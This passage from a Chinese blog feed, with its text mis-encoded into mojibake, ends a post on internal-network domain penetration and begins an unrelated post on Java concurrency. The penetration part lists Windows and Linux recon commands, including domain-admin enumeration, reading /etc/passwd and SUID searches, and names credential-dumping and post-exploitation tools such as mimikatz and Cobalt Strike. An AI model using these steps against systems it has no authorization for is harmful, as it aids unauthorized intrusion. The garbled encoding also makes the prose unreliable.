<li>å…¨å±€ç»„ï¼šæ¥ç»„æœ¬åŸŸä½œç”¨äºå…¨æ—</li>
<li>é€šç”¨ç»„ï¼šæ¥è‡ªå…¨æ—ä½œç”¨äºå…¨æ—</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æœ¬åœ°åŸŸç»„çš„æƒé™</span><br><span class="line">Administratorsï¼ˆç®¡ç†å‘˜ç»„ï¼‰ â€”â€”â€”â€”æœ€é‡è¦çš„æƒé™</span><br><span class="line"></span><br><span class="line">Remote Desktop Usersï¼ˆè¿œç¨‹ç™»å½•ç»„ï¼‰</span><br><span class="line"></span><br><span class="line">Print Operatorsï¼ˆæ‰“å°æœºæ“ä½œå‘˜ç»„ï¼‰</span><br><span class="line"></span><br><span class="line">Account Operatorsï¼ˆå¸å·æ“ä½œå‘˜ç»„ï¼‰</span><br><span class="line"></span><br><span class="line">Server Operatersï¼ˆæœåŠ¡å™¨æ“ä½œå‘˜ç»„ï¼‰</span><br><span class="line"></span><br><span class="line">Backup Operatorsï¼ˆå¤‡ä»½æ“ä½œå‘˜ç»„ï¼‰</span><br><span class="line">å…¨å±€ç»„ã€é€šç”¨ç»„çš„æƒé™ï¼š</span><br><span class="line">Domain Adminsï¼ˆåŸŸç®¡ç†å‘˜ç»„ï¼‰â€”â€”â€”â€”æœ€æœ€æœ€é‡è¦çš„æƒé™ï¼Œä¸€èˆ¬æ¥è¯´åŸŸæ¸—é€æ˜¯çœ‹é‡è¿™ä¸ª</span><br><span class="line"></span><br><span class="line">Enterprise Adminsï¼ˆä¼ä¸šç³»ç»Ÿç®¡ç†å‘˜ç»„ï¼‰â€”â€”â€”â€”æœ€é‡è¦çš„æƒé™ï¼Œå…¶æ¬¡æ˜¯å»çœ‹é‡è¿™ä¸ªæƒé™</span><br><span class="line"></span><br><span class="line">Schema Adminsï¼ˆæ¶æ„ç®¡ç†å‘˜ç»„ï¼‰â€”â€”â€”â€”æœ€é‡è¦çš„æƒé™</span><br><span class="line"></span><br><span class="line">Domain Usersï¼ˆåŸŸç”¨æˆ·ç»„)</span><br></pre></td></tr></table></figure>

<h1 id="å…­ã€å†…ç½‘ä¿¡æ¯æ”¶é›†-é‡ç‚¹"><a href="#å…­ã€å†…ç½‘ä¿¡æ¯æ”¶é›†-é‡ç‚¹" class="headerlink" title="å…­ã€å†…ç½‘ä¿¡æ¯æ”¶é›†            é‡ç‚¹"></a>å…­ã€å†…ç½‘ä¿¡æ¯æ”¶é›†            é‡ç‚¹</h1><p>ç›®æ ‡èµ„äº§ä¿¡æ¯æœé›†çš„ç¨‹åº¦ï¼Œå†³å®šæ¸—é€è¿‡ç¨‹çš„å¤æ‚ç¨‹åº¦ã€‚<br>ç›®æ ‡ä¸»æœºä¿¡æ¯æœé›†çš„æ·±åº¦ï¼Œå†³å®šåæ¸—é€æƒé™æŒç»­æŠŠæ§ã€‚<br>æ¸—é€çš„æœ¬è´¨æ˜¯ä¿¡æ¯æœé›†ï¼Œè€Œä¿¡æ¯æœé›†æ•´ç†ä¸ºåç»­çš„æƒ…æŠ¥è·Ÿè¿›æä¾›äº†å¼ºå¤§çš„ä¿è¯ã€‚</p>
<h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p><strong>ç³»ç»Ÿç›¸å…³</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯</span><br><span class="line">systeminfo /all</span><br><span class="line"></span><br><span class="line">#æŸ¥çœ‹è¡¥ä¸åˆ—è¡¨</span><br><span class="line">wmic qfe getCaption,Description,HotFixID,InstalledOn</span><br><span class="line"></span><br><span class="line">#æŸ¥çœ‹ä¸»æœºå¼€æœºæ—¶é—´</span><br><span class="line">net statistics workstation</span><br><span class="line"></span><br><span class="line">#æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡</span><br><span class="line">schtasks /query /fo LIST /v             #queryæ˜¾ç¤ºæ‰€æœ‰è®¡åˆ’ä»»åŠ¡</span><br></pre></td></tr></table></figure>

<p><strong>ç”¨æˆ·ç›¸å…³</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#æ£€æŸ¥å½“å‰ç”¨æˆ·ï¼Œæƒé™</span><br><span class="line">whoami /user &amp;&amp; whoami /priv</span><br><span class="line">whoami /all        #æŸ¥çœ‹å½“å‰åŸŸå¹¶è·å–åŸŸSID</span><br><span class="line"></span><br><span class="line">#æŸ¥çœ‹åœ¨çº¿ç”¨æˆ·ä¿¡æ¯</span><br><span class="line">quser</span><br><span class="line">query user || qwinsta</span><br></pre></td></tr></table></figure>

<p><strong>ç¨‹åºç›¸å…³</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#æŸ¥çœ‹æ€æ¯’è½¯ä»¶</span><br><span class="line">wmic /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName /Format:List</span><br><span class="line"></span><br><span class="line">#æŸ¥çœ‹å®‰è£…çš„ç¨‹åºå’Œç‰ˆæœ¬</span><br><span class="line">wmic product getname,version</span><br><span class="line"></span><br><span class="line">#æŸ¥è¯¢è¿è¡Œçš„è¿›ç¨‹</span><br><span class="line">tasklist</span><br><span class="line">wmic process list brief</span><br><span class="line">wmic process getprocessid,executablepath,name      #æ˜¾ç¤ºè¿›ç¨‹çš„è·¯å¾„ã€åç§°ã€pid</span><br><span class="line">wmic servicelist brief                             #æŸ¥çœ‹æœ¬æœºæœåŠ¡</span><br><span class="line"></span><br><span class="line">#è¿œç¨‹æ¡Œé¢è¿æ¥å†å²è®°å½•</span><br><span class="line">cmdkey /l</span><br><span class="line"></span><br><span class="line">#æŸ¥çœ‹è‡ªå¯åŠ¨ç¨‹åºåˆ—è¡¨</span><br><span class="line">wmic startuo getcommand,caption</span><br></pre></td></tr></table></figure>

<p><strong>ç½‘ç»œè¿æ¥ç›¸å…³</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#tcp/udpç½‘ç»œè¿æ¥çŠ¶æ€ï¼Œç«¯å£ä¿¡æ¯</span><br><span class="line">netstat -ano</span><br><span class="line"></span><br><span class="line">ipconfig /all              #æŸ¥è¯¢æœ¬æœºIPæ®µï¼Œæ‰€åœ¨åŸŸç­‰</span><br><span class="line">route print                #æ‰“å°è·¯ç”±ä¿¡æ¯</span><br><span class="line">arp -a                   #æŸ¥çœ‹arpç¼“å­˜ï¼Œå¯ä»¥å‘ç°å†…ç½‘ä¸»æœº</span><br><span class="line"></span><br><span class="line">#æŸ¥çœ‹å±€åŸŸç½‘ä¿¡æ¯</span><br><span class="line">net view            #æŸ¥çœ‹åŒä¸€åŸŸå†…æœºå™¨åˆ—è¡¨</span><br><span class="line">net view \\ip       #æŸ¥çœ‹æŸipå…±äº«</span><br><span class="line">net view \\GHQ      #æŸ¥çœ‹GHQè®¡ç®—æœºçš„å…±äº«èµ„æºåˆ—è¡¨</span><br><span class="line">net view /domain    #æŸ¥çœ‹å†…ç½‘å­˜åœ¨å¤šå°‘ä¸ªåŸŸ</span><br><span class="line">net view /domin:XYZ  #æŸ¥çœ‹XYZåŸŸçš„æœºå™¨åˆ—è¡¨</span><br><span class="line">net accounts /domain  #æŸ¥è¯¢åŸŸç”¨æˆ·å¯†ç è¿‡æœŸç­‰ä¿¡æ¯</span><br><span class="line"></span><br><span class="line">#æŸ¥çœ‹æœ¬æœºå…±äº«</span><br><span class="line">net share</span><br><span class="line">wmic share getname,path,status</span><br></pre></td></tr></table></figure>

<p><strong>åŸŸç›¸å…³</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#åˆ¤æ–­æ˜¯å¦å­˜åœ¨åŸŸ</span><br><span class="line">net config workstation    # æŸ¥çœ‹å½“å‰è®¡ç®—æœºåï¼Œå…¨åï¼Œç”¨æˆ·åï¼Œç³»ç»Ÿç‰ˆæœ¬ï¼Œå·¥ä½œç«™åŸŸï¼Œç™»é™†çš„åŸŸç­‰</span><br><span class="line">net view /domain          # æŸ¥çœ‹åŸŸ</span><br><span class="line"></span><br><span class="line">#æŸ¥çœ‹ä¸»åŸŸæœåŠ¡å™¨</span><br><span class="line">net time /domain           #ä¸»åŸŸæœåŠ¡å™¨ä¼šåŒæ—¶ä½œä¸ºæ—¶é—´æœåŠ¡å™¨</span><br><span class="line"></span><br><span class="line">nltest /DCLIST:god         #æŸ¥çœ‹åŸŸæ§åˆ¶å™¨ä¸»æœºåï¼Œgodä¸ºåŸŸå</span><br><span class="line"></span><br><span class="line">#æŸ¥çœ‹åŸŸç”¨æˆ·ç›¸å…³ä¿¡æ¯</span><br><span class="line">net user /domain          #æ˜¾ç¤ºæ‰€åœ¨åŸŸçš„ç”¨æˆ·</span><br><span class="line">net user åŸŸç”¨æˆ· /domain    #è·å–åŸŸç”¨æˆ·è¯¦ç»†ä¿¡æ¯</span><br><span class="line">net user /domain XXX 123456 #ä¿®æ”¹ç”¨æˆ·å¯†ç ï¼Œéœ€è¦åŸŸç®¡ç†å‘˜æƒé™</span><br><span class="line"></span><br><span class="line">net group /domain       #æŸ¥çœ‹åŸŸå†…ç”¨æˆ·ç»„åˆ—è¡¨</span><br><span class="line">net group &quot;domain admins&quot;/domain       #è·å–åŸŸç®¡ç†å‘˜åˆ—è¡¨</span><br><span class="line">net group &quot;domain controllers&quot;/domain  #æŸ¥çœ‹åŸŸæ§åˆ¶å™¨ç»„</span><br><span class="line">net group &quot;domain computers&quot;/domain   #æŸ¥çœ‹åŸŸæœºå™¨</span><br><span class="line"></span><br><span class="line">#åˆ—å‡ºåŸŸä¿¡ä»»å…³ç³»</span><br><span class="line">nltest /domain_trusts      #åˆ—å‡ºåŸŸä¸åŸŸä¹‹é—´çš„ä¿¡ä»»å…³ç³»</span><br><span class="line"></span><br><span class="line">#è·å¾—åŸŸå†…ç”¨æˆ·è¯¦ç»†ä¿¡æ¯</span><br><span class="line">wmic useraccount get/all   #å¯ä»¥è·å–åˆ°åŸŸç”¨æˆ·çš„ç”¨æˆ·åã€æè¿°ä¿¡æ¯ã€SIDã€åŸŸåã€çŠ¶æ€ç­‰ã€‚</span><br></pre></td></tr></table></figure>

<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p><strong>ç³»ç»Ÿç›¸å…³</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/issue         #æŸ¥çœ‹ç³»ç»Ÿåç§°</span><br><span class="line">cat /etc/Lsb-release   #æŸ¥çœ‹ç³»ç»Ÿåç§°,ç‰ˆæœ¬å·</span><br><span class="line">cat /etc/*release      #æŸ¥çœ‹linuxå‘è¡Œä¿¡æ¯</span><br><span class="line">uname -an              #æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬</span><br><span class="line">cat /proc/version      #æŸ¥çœ‹å†…æ ¸ä¿¡æ¯</span><br><span class="line">cat /proc/cpuinfo      #æŸ¥çœ‹cpuä¿¡æ¯</span><br><span class="line"></span><br><span class="line">#æŸ¥çœ‹æ–‡ä»¶ç³»ç»Ÿ</span><br><span class="line">df -a </span><br><span class="line"></span><br><span class="line">#æŸ¥çœ‹ç³»ç»Ÿæ—¥å¿—</span><br><span class="line">sudo cat /var/log/syslog</span><br><span class="line"></span><br><span class="line">#æŸ¥çœ‹å‘½ä»¤è®°å½•</span><br><span class="line">cat /root/.bash_history</span><br><span class="line">cat ~/.bash_history</span><br></pre></td></tr></table></figure>

<p><strong>ç”¨æˆ·ç›¸å…³</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami     #æŸ¥çœ‹å½“å‰shellæƒé™</span><br><span class="line">id         #æŸ¥çœ‹å½“å‰ç”¨æˆ·çš„æƒé™å’Œæ‰€åœ¨çš„ç®¡ç†ç»„</span><br><span class="line"></span><br><span class="line">#æŸ¥çœ‹ç™»å½•ä¿¡æ¯</span><br><span class="line">w</span><br><span class="line">who</span><br><span class="line">last       #ç™»å…¥è¿‡çš„ç”¨æˆ·ä¿¡æ¯</span><br><span class="line">lastlog    #æ˜¾ç¤ºç³»ç»Ÿä¸­æ‰€æœ‰ç”¨æˆ·æœ€è¿‘ä¸€æ¬¡ç™»å½•ä¿¡æ¯</span><br><span class="line"></span><br><span class="line">#æŸ¥çœ‹è´¦å·ä¿¡æ¯</span><br><span class="line">cat /etc/sudoers</span><br><span class="line">cat /etc/group</span><br><span class="line">cat /etc/passwd</span><br><span class="line"></span><br><span class="line">#åˆ—å‡ºç›®å‰ç”¨æˆ·å¯æ‰§è¡Œä¸æ— æ³•æ‰§è¡Œçš„æŒ‡ä»¤</span><br><span class="line">sudo -l</span><br></pre></td></tr></table></figure>

<p><strong>ç½‘ç»œç›¸å…³</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#æŸ¥è¯¢æœ¬æœºIPä¿¡æ¯</span><br><span class="line">ifconfig</span><br><span class="line">ip a</span><br><span class="line"></span><br><span class="line">#æŸ¥çœ‹ç«¯å£ä¿¡æ¯</span><br><span class="line">netstat -anpt</span><br><span class="line"></span><br><span class="line">#æŸ¥çœ‹ç½‘å¡é…ç½®</span><br><span class="line"> cat /etc/network/interfaces</span><br></pre></td></tr></table></figure>

<p><strong>ç¨‹åºç›¸å…³</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#æŸ¥çœ‹è¿›ç¨‹ä¿¡æ¯</span><br><span class="line">ps -ef  #æ ‡å‡†æ ¼å¼æ˜¾ç¤º</span><br><span class="line">ps aux  #BSDæ ¼å¼æ˜¾ç¤º</span><br><span class="line"></span><br><span class="line">#èµ„æºå æœ‰æƒ…å†µ</span><br><span class="line">top -c</span><br><span class="line"></span><br><span class="line">cat /etc/inetd.conf        #ç”±inetdç®¡ç†çš„æœåŠ¡åˆ—è¡¨</span><br><span class="line">cat /etc/xinetd.conf       #ç”±xinetdç®¡ç†çš„æœåŠ¡åˆ—è¡¨</span><br><span class="line"></span><br><span class="line">#æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡</span><br><span class="line">crontab -l</span><br><span class="line">ls -al /etc/cron*</span><br><span class="line">cat /etc/cron.allow</span><br><span class="line">cat /etc/cron.deny</span><br><span class="line">cat /etc/crontab</span><br><span class="line"></span><br><span class="line">#æŸ¥çœ‹å¼€æœºå¯åŠ¨é¡¹</span><br><span class="line">/etc/rc.d/init.d/</span><br></pre></td></tr></table></figure>

<p><strong>é…ç½®ä¿¡æ¯</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables â€“L   #æŸ¥çœ‹é˜²ç«å¢™é…ç½®ï¼ˆæ³¨æ„éœ€è¦rootæƒé™ï¼‰</span><br><span class="line">cat /etc/resolv.conf   #æŸ¥çœ‹dnsé…ç½®æ–‡ä»¶</span><br><span class="line">cat /etc/network/interfaces    #æŸ¥çœ‹ç½‘å¡é…ç½®æ–‡ä»¶</span><br><span class="line">cat /etc/apache2/apache2.conf   #æŸ¥çœ‹apacheé…ç½®æ–‡ä»¶</span><br><span class="line">cat /etc/my.conf               #mysqlé…ç½®</span><br><span class="line"></span><br><span class="line">#æŸ¥çœ‹suidæ–‡ä»¶</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">#æœ€è¿‘äº”å¤©çš„æ–‡ä»¶</span><br><span class="line">find / -ctime +1 -ctime -5</span><br></pre></td></tr></table></figure>

<h1 id="ä¸ƒã€å†…ç½‘åŸŸæ¸—é€å¸¸ç”¨å·¥å…·"><a href="#ä¸ƒã€å†…ç½‘åŸŸæ¸—é€å¸¸ç”¨å·¥å…·" class="headerlink" title="ä¸ƒã€å†…ç½‘åŸŸæ¸—é€å¸¸ç”¨å·¥å…·"></a>ä¸ƒã€å†…ç½‘åŸŸæ¸—é€å¸¸ç”¨å·¥å…·</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1ã€WCE</span><br><span class="line">WCEï¼ˆWindows å‡­æ®ç®¡ç†å™¨ï¼‰æ˜¯å®‰å…¨äººå‘˜å¹¿æ³›ä½¿ç”¨çš„ä¸€ç§å®‰å…¨å·¥å…·ï¼Œå¸¸ç”¨äºåˆ—å‡ºç™»å½•ä¼šè¯ä»¥åŠæ·»åŠ ã€ä¿®æ”¹ã€å’Œåˆ é™¤å…³è”å‡­æ®ï¼ˆå¦‚LM hashã€NTLM hashã€æ˜æ–‡å¯†ç å’ŒKerberosç¥¨æ®ï¼‰ã€‚</span><br><span class="line">2ã€mimikatz</span><br><span class="line">mimikatzä¸»è¦ç”¨äºä»å†…å­˜ä¸­è·å–æ˜æ–‡å¯†ç ã€ç°é‡‘ç¥¨æ®å’Œå¯†é’¥ç­‰ã€‚</span><br><span class="line">3ã€Responder</span><br><span class="line">Responderå¯ä»¥å—…æ¢ç½‘ç»œä¸­çš„æ‰€æœ‰LLMNRåŒ…å’Œè·å–å„ä¸»æœºçš„ä¿¡æ¯ã€‚</span><br><span class="line">4ã€BeEF</span><br><span class="line">BeEFåˆ©ç”¨XSSé€šè¿‡Java Scriptå¯¹ç›®æ ‡æµè§ˆå™¨è¿›è¡Œæµ‹è¯•ï¼ŒåŒæ—¶å¯ä»¥é…åˆMSFè¿›è¡Œè¿›ä¸€æ­¥æ¸—é€ã€‚</span><br><span class="line">5ã€DSHashes</span><br><span class="line">DSHashesä¸»è¦ä»NTDSXtractä¸­æå–ç”¨æˆ·æ˜“äºç†è§£çš„æ•£åˆ—å€¼ã€‚</span><br><span class="line">6ã€PowerSploit</span><br><span class="line">PowerSploitæ˜¯åŸºäºPowerShellçš„æµ‹è¯•æ¡†æ¶ï¼Œä¸»è¦ç”¨äºä¿¡æ¯æ”¶é›†ã€æƒé™æå‡ä»¥åŠæƒé™ç»´æŒã€‚</span><br><span class="line">7ã€Nishang</span><br><span class="line">Nishangä¹Ÿæ˜¯ä¸€æ¬¾åŸºäºPowerShellçš„æµ‹è¯•å·¥å…·ï¼Œé›†æˆå„ç±»payloadç”¨äºæ¸—é€æµ‹è¯•ã€‚</span><br><span class="line">8ã€Empire</span><br><span class="line">ç±»ä¼¼äºMSFï¼Œä¹Ÿæ˜¯ä¸€æ¬¾æ‹¥æœ‰ä¸°å¯Œæ¨¡å—å’Œæ¥å£çš„æ¸—é€æµ‹è¯•å·¥å…·ã€‚</span><br><span class="line">9ã€ps_encoder.py</span><br><span class="line">ps_encoder.pyæ˜¯ä½¿ç”¨base64å°è£…çš„powershellå‘½ä»¤åŒ…ï¼Œç›®çš„æ˜¯æ··æ·†å’Œå‹ç¼©ä»£ç ã€‚</span><br><span class="line">10ã€smbexec</span><br><span class="line">smbexecæ˜¯ä½¿ç”¨Sambaå·¥å…·çš„å¿«é€ŸPsExecç±»å·¥å…·ï¼Œå®ƒé€šè¿‡ipc$è¿›è¡Œè¿æ¥ï¼Œå°†psexec.exeé‡Šæ”¾åˆ°ç›®æ ‡ä¸»æœºä¸­ï¼Œé“œé¼“æ¬§æœåŠ¡ç®¡ç†ï¼ˆSCManagerï¼‰è¿›ç¨‹åˆ›å»ºpsexecsvcæœåŠ¡å¹¶å¯åŠ¨æœåŠ¡å¹¶èƒ½ç›´æ¥æä¾›ç›®æ ‡ä¸»æœºçš„systemæƒé™ã€‚</span><br><span class="line">11ã€the-backdoor-factory-master</span><br><span class="line">the-backdoor-factory-masterå¯ä»¥å¯¹PEã€ELFã€Mach-Oç­‰äºŒè¿›åˆ¶æ–‡ä»¶æ³¨å…¥shellcodeã€‚</span><br><span class="line">12ã€Veil</span><br><span class="line">Veilç”¨äºç”Ÿæˆç»•è¿‡å¸¸è§é˜²ç—…æ¯’è§£å†³æ–¹æ¡ˆçš„MSFæœ‰æ•ˆè½½è·ã€‚</span><br><span class="line">13ã€MSF</span><br><span class="line">ä¸–ç•Œä¸Šæœ€å¸¸ç”¨çš„æ¸—é€æµ‹è¯•æ¡†æ¶ã€‚</span><br><span class="line">14ã€Cobalt Strike</span><br><span class="line">Cobalt Strikeä¸»è¦ç”¨äºå†…ç½‘æ¸—é€ï¼Œå¹¶æä¾›å›¢é˜Ÿåä½œåŠŸèƒ½ã€‚</span><br><span class="line">15ã€Nmap</span><br><span class="line">Nmapä¸»è¦ç”¨äºå‘ç°ä¸»æœºã€æ‰«æç«¯å£ã€è¯†åˆ«æœåŠ¡å’Œæ“ä½œç³»ç»Ÿç­‰</span><br><span class="line">16ã€Wireshark</span><br><span class="line">Wiresharkä¸»è¦ç”¨äºç½‘ç»œåè®®å’Œæ•°æ®åŒ…åˆ†æï¼Œå¯ä»¥é€šè¿‡ç½‘ç»œæ¥å£å¯¹æ•´ä¸ªç½‘ç»œæ¥å£è¿›è¡Œç›‘å¬ã€‚</span><br><span class="line">17ã€Putty</span><br><span class="line">Puttyåœ¨windowsä¸‹ä¸»è¦ä½œä¸ºè¿æ¥SSH ä»¥åŠ Telnet çš„å®¢æˆ·ç«¯ã€‚</span><br><span class="line">18ã€sqlmap</span><br><span class="line">sqlmapä¸»è¦ç”¨äºæ£€æµ‹å’Œåˆ©ç”¨SQLæ³¨å…¥æ¼æ´ã€‚</span><br><span class="line">19ã€Burp Suite</span><br><span class="line">Burp Suiteä¸»è¦ç”¨äºå¯¹webåº”ç”¨ç¨‹åºè¿›è¡Œæµ‹è¯•ï¼Œæœ€é‡è¦çš„å‡ ä¸ªæ¨¡å—ä¸ºIntruderã€Proxyã€Repeaterï¼Œç”¨äºæŠ“åŒ…åˆ†æã€å‚æ•°çˆ†ç ´ä»¥åŠé‡æ”¾æ”»å‡»ã€‚</span><br><span class="line">20ã€Hydra</span><br><span class="line">Hydraï¼ˆä¹å¤´è›‡ï¼‰ä¸»è¦ç”¨äºç™»å½•çˆ†ç ´ã€‚</span><br><span class="line">21ã€Getif</span><br><span class="line">Getifä¸»è¦ç”¨äºæ”¶é›†SNMPè®¾å¤‡çš„ä¿¡æ¯ã€‚</span><br><span class="line">22ã€Cain&amp;Abel</span><br><span class="line">Cain&amp;Abelæ˜¯windowsä¸­çš„ä¸€ä¸ªå¯†ç æ¢å¤å·¥å…·ï¼Œå¯ä»¥é€šè¿‡å—…æ¢ç½‘ç»œï¼Œæ¥ç ´è§£åŠ å¯†å¯†ç ã€è®°å½•VoIPä¼šè¯ã€æ¢å¤æ— çº¿ç½‘ç»œå¯†é’¥ã€æ˜¾ç¤ºé¢è†œæ¡†ã€å‘ç°ç¼“å­˜ä¸­çš„å¯†ç ã€åˆ†æè·¯ç”±ä¿¡æ¯ã€å¹¶èƒ½æ¢å¤å„ç§å¯†ç ã€‚</span><br></pre></td></tr></table></figure>

<p>æ›´è¯¦ç»†è§<a href="https://websec.readthedocs.io/zh/latest/intranet/index.html">https://websec.readthedocs.io/zh/latest/intranet/index.html</a></p>
<p>åŸŸæ¸—é€åŸºç¡€çŸ¥è¯†å¤§å…¨ï¼š<a href="https://decemberus.com/2023/08/02/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">https://decemberus.com/2023/08/02/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</a>    é‡ç‚¹</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
      </tags>
  </entry>
  <entry>
    <title>JUCå¹¶å‘ç¼–ç¨‹</title>
    <url>/2024/10/07/JUC%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/</url>
    <content><![CDATA[<p>è®°å½•å­¦ä¹ Java JUC</p>
<span id="more"></span>

<h1 id="1ã€JUCä»‹ç»"><a href="#1ã€JUCä»‹ç»" class="headerlink" title="1ã€JUCä»‹ç»"></a>1ã€JUCä»‹ç»</h1><p><strong>æºç +å®˜æ–¹æ–‡æ¡£</strong></p>
<p>java.util.concurrent</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-07/2ddf094e6a13c1260581e88ddaafb21b--dba2--image-20241007142426475.png" alt="image-20241007142426475"></p>
<p>æ™®é€šçš„çº¿ç¨‹ä»£ç Thread</p>
<p>Runnableæ²¡æœ‰è¿”å›å€¼ï¼Œæ•ˆç‡ç›¸æ¯”Callableç›¸å¯¹è¾ƒä½</p>
<h1 id="2ã€çº¿ç¨‹ä¸è¿›ç¨‹"><a href="#2ã€çº¿ç¨‹ä¸è¿›ç¨‹" class="headerlink" title="2ã€çº¿ç¨‹ä¸è¿›ç¨‹"></a>2ã€çº¿ç¨‹ä¸è¿›ç¨‹</h1><blockquote>
<p>è¿›ç¨‹ã€çº¿ç¨‹</p>
</blockquote>
<p>è¿›ç¨‹ï¼šå°±æ¯”å¦‚ä½ æ¡Œé¢ä¸Šçš„ä»»ä½•ä¸€ä¸ªè½¯ä»¶ï¼ŒQQã€å¾®ä¿¡è¿™äº›</p>
<p>ä¸€ä¸ªè¿›ç¨‹å¯ä»¥åŒ…å«å¤šä¸ªçº¿ç¨‹ï¼Œè‡³å°‘ä¹Ÿæœ‰ä¸€ä¸ªçº¿ç¨‹</p>
<p>Javaé»˜è®¤å°±æ˜¯æœ‰ä¸¤ä¸ªçº¿ç¨‹ï¼šâ‘ mainçº¿ç¨‹ã€‚â‘¡GCåƒåœ¾å›æ”¶çº¿ç¨‹</p>
<p>ä½†æ˜¯æœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯ï¼Ÿ</p>
<p><strong>JavaçœŸçš„å¯ä»¥å¼€å¯çº¿ç¨‹å—ï¼Ÿ  â€”â€“ä¸å¯ä»¥ï¼</strong></p>
<p>Threadéƒ¨åˆ†æºç </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * This method is not invoked for the main method thread or &quot;system&quot;</span></span><br><span class="line"><span class="comment">     * group threads created/set up by the VM. Any new functionality added</span></span><br><span class="line"><span class="comment">     * to this method in the future may have to also be added to the VM.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * A zero status value corresponds to state &quot;NEW&quot;.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (threadStatus != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalThreadStateException</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Notify the group that this thread is about to be started</span></span><br><span class="line"><span class="comment">     * so that it can be added to the group&#x27;s list of threads</span></span><br><span class="line"><span class="comment">     * and the group&#x27;s unstarted count can be decremented. */</span></span><br><span class="line">    group.add(<span class="built_in">this</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">started</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        start0();</span><br><span class="line">        started = <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!started) &#123;</span><br><span class="line">                group.threadStartFailed(<span class="built_in">this</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable ignore) &#123;</span><br><span class="line">            <span class="comment">/* do nothing. If start0 threw a Throwable then</span></span><br><span class="line"><span class="comment">              it will be passed up the call stack */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æœ¬åœ°æ–¹æ³•ï¼Œåº•å±‚çš„C++ javaæ— æ³•ç›´æ¥æ“ä½œç¡¬ä»¶</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">start0</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-07/e4042aa096489027d5a5149a194e444f--1875--image-20241007143609517.png" alt="image-20241007143609517">å¹¶å‘ã€å¹¶è¡Œ</p>
<p>å¹¶å‘ï¼ˆå¤šçº¿ç¨‹æ“ä½œåŒä¸€ä¸ªèµ„æºï¼‰</p>
<ul>
<li>CPUå•æ ¸ï¼Œæ¨¡æ‹Ÿå‡ºæ¥å¤šæ¡çº¿ç¨‹ï¼Œå¤©ä¸‹æ­¦åŠŸï¼Œå”¯å¿«ä¸ç ´ï¼Œå¿«é€Ÿäº¤æ›¿</li>
</ul>
<p>å¹¶è¡Œï¼ˆå¤šä¸ªäººä¸€æ¬¡è¡Œèµ°ï¼‰</p>
<ul>
<li>CPUå¤šæ ¸ï¼Œå¤šä¸ªçº¿ç¨‹å¯ä»¥åŒæ—¶æ‰§è¡Œ;çº¿ç¨‹æ± </li>
</ul>
<p>æŸ¥è¯¢cpuæ ¸æ•°</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//æŸ¥è¯¢cpuæ ¸æ•°</span></span><br><span class="line">        <span class="comment">//CPU å¯†é›†å‹ï¼ŒIOå¯†é›†å‹</span></span><br><span class="line">        System.out.println(Runtime.getRuntime().availableProcessors());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

